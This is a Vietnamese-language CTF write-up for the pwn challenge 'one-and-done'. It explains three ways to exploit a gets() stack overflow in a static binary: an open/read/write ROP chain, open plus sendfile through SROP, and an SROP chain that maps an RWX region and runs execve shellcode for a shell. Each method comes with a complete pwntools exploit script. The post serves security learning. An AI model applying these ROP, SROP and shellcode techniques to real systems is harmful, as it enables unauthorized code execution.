---
title: one-and-done
date: 2025-02-12 00:00:00 +0800
categories: [pwn]
tags: [rop]
author: "kuvee"
layout: post
---

## overview

- checksec : 

```cs
[*] '/home/ploi/pwn/ROP/tamu_ctf/one-and-done'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

- file : 

```cs
ploi@PhuocLoiiiii:~/pwn/ROP/tamu_ctf$ file one-and-done
one-and-done: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, with debug_info, not stripped
```

- nhìn qua thì thấy đây là 1 bài rop bình thường và có cả puts , tuy nhiên thì file này là 1 file static nên ta không thể leak libc và lấy shell như bình thườnng được

```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[128]; // [rsp+0h] [rbp-120h] BYREF
  sigaction sa; // [rsp+80h] [rbp-A0h] BYREF

  memset(&sa, 0LL, sizeof(sa));
  sa.sa_handler = (void (*)(int))handler;
  sa.sa_flags = 4;
  sigaction_0(11, &sa, 0LL);
  puts("pwn me pls");
  gets(s);
  return 0;
}
```

### cách 1 : open + read + write
- đầu tiên đơn giản là read chuỗi path vào bss , tiếp theo là open read writewrite

```cs
def read(writable,fd =3 ,count = 0x100):
    pl = p64(pop_rax) + p64(0)
    pl += p64(pop_rdi) + p64(fd)
    pl += p64(pop_rsi) + p64(writable)
    pl += p64(pop_rdx) + p64(count)
    pl += p64(syscall_ret) + p64(exe.sym.main)
    return pl

def read_flag(writable,fd =3 ,count = 0x100):
    pl = p64(pop_rax) + p64(0)
    pl += p64(pop_rdi) + p64(fd)
    pl += p64(pop_rsi) + p64(writable)
    pl += p64(pop_rdx) + p64(count)
    pl += p64(syscall_ret)
    return pl

#       const char *filename, int flags, umode_t mode
def open(filename,flags=0,mode=0):
    pl = p64(pop_rax) + p64(2)
    pl += p64(pop_rdi) + p64(filename)
    pl += p64(pop_rsi) + p64(flags)
    pl += p64(pop_rdx) + p64(mode)
    pl += p64(syscall_ret)
    return pl
# unsigned int fd, const char *buf, size_t count
def write(writable,fd=1,count=0x100):
    pl = p64(pop_rax) + p64(fd)
    pl += p64(pop_rdi) + p64(fd)
    pl += p64(pop_rsi) + p64(writable)
    pl += p64(pop_rdx) + p64(count)
    pl += p64(syscall_ret)
    return pl
```

exp (orw) : 

```python
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./one-and-done',checksec=False)

p = process()

offset = 0x120
pop_rdi = 0x0000000000401793
pop_rsi = 0x0000000000401713
pop_rdx = 0x0000000000401f31
syscall_ret = 0x0000000000401ab2
pop_rax = 0x000000000040100b
bss = 0x405ea0
gets_addr = 0x0000000000401230


#       unsigned int fd, char *buf, size_t count
def read(writable,fd =3 ,count = 0x100):
    pl = p64(pop_rax) + p64(0)
    pl += p64(pop_rdi) + p64(fd)
    pl += p64(pop_rsi) + p64(writable)
    pl += p64(pop_rdx) + p64(count)
    pl += p64(syscall_ret) + p64(exe.sym.main)
    return pl

def read_flag(writable,fd =3 ,count = 0x100):
    pl = p64(pop_rax) + p64(0)
    pl += p64(pop_rdi) + p64(fd)
    pl += p64(pop_rsi) + p64(writable)
    pl += p64(pop_rdx) + p64(count)
    pl += p64(syscall_ret)
    return pl

#       const char *filename, int flags, umode_t mode
def open(filename,flags=0,mode=0):
    pl = p64(pop_rax) + p64(2)
    pl += p64(pop_rdi) + p64(filename)
    pl += p64(pop_rsi) + p64(flags)
    pl += p64(pop_rdx) + p64(mode)
    pl += p64(syscall_ret)
    return pl
# unsigned int fd, const char *buf, size_t count
def write(writable,fd=1,count=0x100):
    pl = p64(pop_rax) + p64(fd)
    pl += p64(pop_rdi) + p64(fd)
    pl += p64(pop_rsi) + p64(writable)
    pl += p64(pop_rdx) + p64(count)
    pl += p64(syscall_ret)
    return pl


def state1():
    payload = b'a'*0x128
    payload += read(bss,0)
    return payload

def state2():
    payload = b'a'*0x128
    payload += open(bss)
    payload += read_flag(bss+0x50)
    payload += write(bss+0x50)
    return payload

input()
payload2 = state1()
p.sendlineafter(b'pwn me pls',payload2)
input()
p.send(b'./flag.txt\x00')

payload3 = state2()
p.sendlineafter(b'pwn me pls',payload3)




p.interactive()
```

### cách 2 (open + sendfile)

- trước tiên cần biết cách setup syscall ```sendfile``` , ở đây 

1. in_fd sẽ là read và out_fd sẽ là write
2.  Nếu offset là NULL, thì dữ liệu sẽ được đọc từ in_fd , thằng này sẽ là NULLNULL
3.  count là số byte cần sao chép giữa các mô tả tệp , có nghĩa là từ read sang write (số byte được in ra)

vậy out_fd sẽ là 1 và in_fd là 3
```cs
#include <sys/sendfile.h>

       ssize_t sendfile(int out_fd, int in_fd, off_t *_Nullable offset,
                        size_t count);
```

- ở đây tham số thứ 4 là r10 , tuy nhiên ta không có gadget nào control nó :

```cs
ploi@PhuocLoiiiii:~/pwn/ROP/tamu_ctf$ ropper -f one-and-done | grep r10
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
0x0000000000401e42: add eax, 0xdaf88348; jne 0x1e0d; xor r10d, r10d; xor esi, esi; mov rax, rbx; syscall;
0x0000000000401d8a: add eax, 0xfa8948c3; mov r10d, 8; lea rsi, [rip + 0x129c]; xor edi, edi; mov eax, 0xe; syscall;
0x0000000000401ad4: add edi, eax; cmp byte ptr [r10], al; add byte ptr [rax], al; add byte ptr [rax + 0xda], bh; lea rdi, [rip + 0x4328]; syscall;
0x0000000000401ad6: cmp byte ptr [r10], al; add byte ptr [rax], al; add byte ptr [rax + 0xda], bh; lea rdi, [rip + 0x4328]; syscall;

0x000000000040226b: cmp byte ptr [r8 + 0x39], r9b; sub byte ptr [r10 + rcx + 0x31], r14b; sal byte ptr [rcx], cl; test byte ptr [rax - 0x77], -0x11; call qword ptr [rbp + 0x48];
0x000000000040226c: cmp byte ptr [rax + 0x39], cl; sub byte ptr [r10 + rcx + 0x31], r14b; sal byte ptr [rcx], cl; test byte ptr [rax - 0x77], -0x11; call qword ptr [rbp + 0x48];
0x0000000000401e44: cmp eax, -0x26; jne 0x1e0d; xor r10d, r10d; xor esi, esi; mov rax, rbx; syscall;
0x0000000000401e43: cmp rax, -0x26; jne 0x1e0d; xor r10d, r10d; xor esi, esi; mov rax, rbx; syscall;
0x0000000000401e46: fidiv dword ptr [rbp - 0x3c]; xor r10d, r10d; xor esi, esi; mov rax, rbx; syscall;
0x0000000000401e33: jae 0x1e55; movsxd rdx, edx; xor r10d, r10d; mov rax, rbx; mov rsi, rbp; syscall;
0x0000000000401e47: jne 0x1e0d; xor r10d, r10d; xor esi, esi; mov rax, rbx; syscall;
0x0000000000401a3f: jns 0x1a63; movsxd rdx, r8d; xor r10d, r10d; mov rax, r9; mov rsi, rbx; syscall;
0x0000000000401d8d: mov edx, edi; mov r10d, 8; lea rsi, [rip + 0x129c]; xor edi, edi; mov eax, 0xe; syscall;
0x0000000000401d73: mov edx, edi; mov r10d, 8; lea rsi, [rip + 0x12be]; xor edi, edi; mov eax, 0xe; syscall;
0x0000000000401579: mov esi, esp; movsxd rdi, r12d; mov r10d, 8; mov eax, 0xd; syscall;
0x0000000000401d8f: mov r10d, 8; lea rsi, [rip + 0x129c]; xor edi, edi; mov eax, 0xe; syscall;
0x0000000000401d75: mov r10d, 8; lea rsi, [rip + 0x12be]; xor edi, edi; mov eax, 0xe; syscall;
0x000000000040157e: mov r10d, 8; mov eax, 0xd; syscall;
0x0000000000401da9: mov r10d, 8; mov eax, 0xe; xor edx, edx; mov edi, 2; syscall;
0x000000000040210d: mov rdx, r10; mov rsi, r9; mov rdi, r8; call 0x1fee; add rsp, 0x18; ret;
0x0000000000401d8c: mov rdx, rdi; mov r10d, 8; lea rsi, [rip + 0x129c]; xor edi, edi; mov eax, 0xe; syscall;
0x0000000000401d72: mov rdx, rdi; mov r10d, 8; lea rsi, [rip + 0x12be]; xor edi, edi; mov eax, 0xe; syscall;
0x0000000000401578: mov rsi, rsp; movsxd rdi, r12d; mov r10d, 8; mov eax, 0xd; syscall;
0x000000000040157b: movsxd rdi, r12d; mov r10d, 8; mov eax, 0xd; syscall;
0x0000000000401e35: movsxd rdx, edx; xor r10d, r10d; mov rax, rbx; mov rsi, rbp; syscall;
0x0000000000401a41: movsxd rdx, r8d; xor r10d, r10d; mov rax, r9; mov rsi, rbx; syscall;
0x000000000040226f: sub byte ptr [r10 + rcx + 0x31], r14b; sal byte ptr [rcx], cl; test byte ptr [rax - 0x77], -0x11; call qword ptr [rbp + 0x48];
0x0000000000401576: xor edx, edx; mov rsi, rsp; movsxd rdi, r12d; mov r10d, 8; mov eax, 0xd; syscall;
0x0000000000401a44: xor r10d, r10d; mov rax, r9; mov rsi, rbx; syscall;
0x0000000000401e38: xor r10d, r10d; mov rax, rbx; mov rsi, rbp; syscall;
0x0000000000401e49: xor r10d, r10d; xor esi, esi; mov rax, rbx; syscall;
0x0000000000401e45: clc; fidiv dword ptr [rbp - 0x3c]; xor r10d, r10d; xor esi, esi; mov rax, rbx; syscall;
0x000000000040157d: cld; mov r10d, 8; mov eax, 0xd; syscall;
0x0000000000401d8e: cli; mov r10d, 8; lea rsi, [rip + 0x129c]; xor edi, edi; mov eax, 0xe; syscall;
0x0000000000401d74: cli; mov r10d, 8; lea rsi, [rip + 0x12be]; xor edi, edi; mov eax, 0xe; syscall;
```

- vì vậy ta sẽ dùng ```SROP``` để có thể control được ```r10``` : 

script : 

```cs
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./one-and-done',checksec=False)

p = process()

offset = 0x120
pop_rdi = 0x0000000000401793
pop_rsi = 0x0000000000401713
pop_rdx = 0x0000000000401f31
syscall_ret = 0x0000000000401ab2
pop_rax = 0x000000000040100b
bss = 0x405ea0
gets_addr = 0x0000000000401230


#       unsigned int fd, char *buf, size_t count
def read(writable,fd =3 ,count = 0x100):
    pl = p64(pop_rax) + p64(0)
    pl += p64(pop_rdi) + p64(fd)
    pl += p64(pop_rsi) + p64(writable)
    pl += p64(pop_rdx) + p64(count)
    pl += p64(syscall_ret) + p64(exe.sym.main)
    return pl

def read_flag(writable,fd =3 ,count = 0x100):
    pl = p64(pop_rax) + p64(0)
    pl += p64(pop_rdi) + p64(fd)
    pl += p64(pop_rsi) + p64(writable)
    pl += p64(pop_rdx) + p64(count)
    pl += p64(syscall_ret)
    return pl

#       const char *filename, int flags, umode_t mode
def open(filename,flags=0,mode=0):
    pl = p64(pop_rax) + p64(2)
    pl += p64(pop_rdi) + p64(filename)
    pl += p64(pop_rsi) + p64(flags)
    pl += p64(pop_rdx) + p64(mode)
    pl += p64(syscall_ret)
    return pl
# unsigned int fd, const char *buf, size_t count
def write(writable,fd=1,count=0x100):
    pl = p64(pop_rax) + p64(fd)
    pl += p64(pop_rdi) + p64(fd)
    pl += p64(pop_rsi) + p64(writable)
    pl += p64(pop_rdx) + p64(count)
    pl += p64(syscall_ret)
    return pl

def sendfile():
    '''call sendfile(rdi=0x1, rsi=0x3, rdx=0x0, r10=0x7fffffff)'''
    pl = p64(pop_rax) + p64(0xf)
    pl += p64(syscall_ret)
    frame = SigreturnFrame(arch = "amd64", kernel="amd64")
    frame.rax = constants.SYS_sendfile
    frame.rsi = 3
    frame.rdi = 1
    frame.rdx = 0
    frame.r10 = 0x50
    frame.rip = syscall_ret
    pl += bytes(frame)
    return pl


def state1():
    payload = b'a'*0x128
    payload += read(bss,0)
    return payload

def state2():
    payload = b'a'*0x128
    payload += open(bss)
    payload += sendfile()
    return payload

input()
payload2 = state1()
p.sendlineafter(b'pwn me pls',payload2)
input()
p.send(b'./flag.txt\x00')

payload3 = state2()
p.sendlineafter(b'pwn me pls',payload3)




p.interactive()
```

![flag](/assets/images/flagshellcode1.png)


### cách 3 : srop + mmap + shellcode 

- vì rảnh và lâu rồi không làm srop nên mình mất tầm 2 tiếng để giải quyết theo cách này =)))  , mình đã cố gắng không sử dụng các **gadget** và chỉ sử dụng mỗi **srop**

- trước hết vì ta không thể control được địa chỉ nào để khi **srop** nó sẽ quay về **main** 1 lần nữa , mình sẽ ghi **main** vào **bss** trước , ở đây ta cần tránh ghi đè vào các dữ liệu khác 

```python
def read_main():
    payload = p64(pop_rax) + p64(0xf)
    payload += p64(syscall_ret)
    frame = SigreturnFrame(arch="amd64",kernel="amd64")
    frame.rax = 0
    frame.rdi = 0
    frame.rsi = bss
    frame.rdx = 16
    frame.rsp = bss
    frame.rip = syscall_ret
    payload += bytes(frame)
    return payload
```

- rsp ở đây sẽ là con trỏ chứa địa chỉ main -> nó sẽ return về main , tiếp theo stack lúc này sẽ là **bss** và vì **PIE** tắt nên ta hoàn toàn có thể debug và biết được tiếp theo nó sẽ return về đâu 

- ở lần sử dụng **Sigreturn** tiếp theo mình sẽ setup **mmap** 1 địa chỉ với full quyền (rwx) , và rsp sẽ chuỗi rop giúp ta có thêm 1 lần **srop** nữa , lần **srop** kế tiếp sẽ là dùng **gets** , tại sao mình lại sử dụng **gets** ? vì khi đó sau khi **gets** xong thì dữ liệu sẽ được đặt ở **rax** , ta sẽ kết hợp với **call_rax** để thực thi shellcode ^^

đây là setup cho **mmap**

```python
def mmap():
    payload = p64(pop_rax) + p64(0xf)
    payload += p64(syscall_ret)

    frame = SigreturnFrame(arch = "amd64", kernel="amd64")
    frame.rax = 0x9
    frame.rdi = 0x200000
    frame.rsi = 0x100000
    frame.rdx = constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC
    frame.r10 = constants.MAP_ANONYMOUS | constants.MAP_PRIVATE | constants.MAP_FIXED
    frame.r8 = -1
    frame.rip = syscall_ret
    frame.rsp = 0x404898

    payload += bytes(frame)
    return payload
```

exp: 

```python
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./one-and-done',checksec=False)

p = process()

offset = 0x120
pop_rdi = 0x0000000000401793
pop_rsi = 0x0000000000401713
pop_rdx = 0x0000000000401f31
syscall_ret = 0x0000000000401ab2
pop_rax = 0x000000000040100b
bss = 0x404780
gets_addr = 0x0000000000401230
offset = 0x128
call_rax = 0x0000000000402390
gets = 0x401795
#mmap(0x0, 0x1000000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED)
def read_main():
    payload = p64(pop_rax) + p64(0xf)
    payload += p64(syscall_ret)
    frame = SigreturnFrame(arch="amd64",kernel="amd64")
    frame.rax = 0
    frame.rdi = 0
    frame.rsi = bss
    frame.rdx = 16
    frame.rsp = bss
    frame.rip = syscall_ret
    payload += bytes(frame)
    return payload

def read_shellcode():
    payload = p64(pop_rax) + p64(0xf)
    payload += p64(syscall_ret)
    frame = SigreturnFrame(arch="amd64",kernel="amd64")
    frame.rax = 0
    frame.rdi = 0
    frame.rsi = 0x200000
    frame.rdx = 0x300
    frame.rsp = bss
    frame.rip = syscall_ret
    payload += bytes(frame)
    payload += p64(call_rax)
    return payload

def mmap():
    payload = p64(pop_rax) + p64(0xf)
    payload += p64(syscall_ret)

    frame = SigreturnFrame(arch = "amd64", kernel="amd64")
    frame.rax = 0x9
    frame.rdi = 0x200000
    frame.rsi = 0x100000
    frame.rdx = constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC
    frame.r10 = constants.MAP_ANONYMOUS | constants.MAP_PRIVATE | constants.MAP_FIXED
    frame.r8 = -1
    frame.rip = syscall_ret
    frame.rsp = 0x404898

    payload += bytes(frame)
    return payload

payload = b'a'*offset
payload += read_main()
input("stage1")
p.sendlineafter(b'pwn me pls',payload)
input()
p.sendline(p64(exe.sym.main))

input("stage2")
payload3 = b'a'*offset
payload3 += mmap()
payload3 += p64(pop_rax)
payload3 += p64(0xf)
payload3 += p64(syscall_ret)

frame = SigreturnFrame(arch="amd64",kernel="amd64")
frame.rdi = 0x200000
frame.rip = gets
frame.rsp = 0x4049a8
payload3 += bytes(frame)
payload3 += p64(call_rax)



p.sendline(payload3)
shellcode = asm('''
                xor rax,rax
                xor rdi,rdi
                xor rsi,rsi
                xor rdx,rdx
                movabs rdi,29400045130965551
                push rdi
                mov rdi,rsp
                mov al,0x3b
                syscall
                ''')
input()
p.sendline(shellcode)





p.interactive()
```

- chú ý rằng các địa chỉ được setup ở frame.rsp là do debug mà mình có được 

![shell](/assets/images/shellhehe.png)

- 1 cách khác nữa là sử dụng gadget này : ```0x000000000040213a: mov dword ptr [rdi], eax; or eax, 0xffffffff; ret;``` , mình lười quá nên để ở đây , ta cần setup **rax** sẽ là chuỗi flag và rdi là nơi ta muốn đặt nó vào , chú ý ở đây chỉ được đặt 4 bytes nên nếu path dài thì phải đặt nhiều lần
- 1 cách khác nữa là dùng ```mprotect``` như **mmap** ta có thể leak **libc_stack_end** để lấy địa chỉ stack và read shellcode vào stack , nói chung vẫn là dùng shellcode để lấy shell 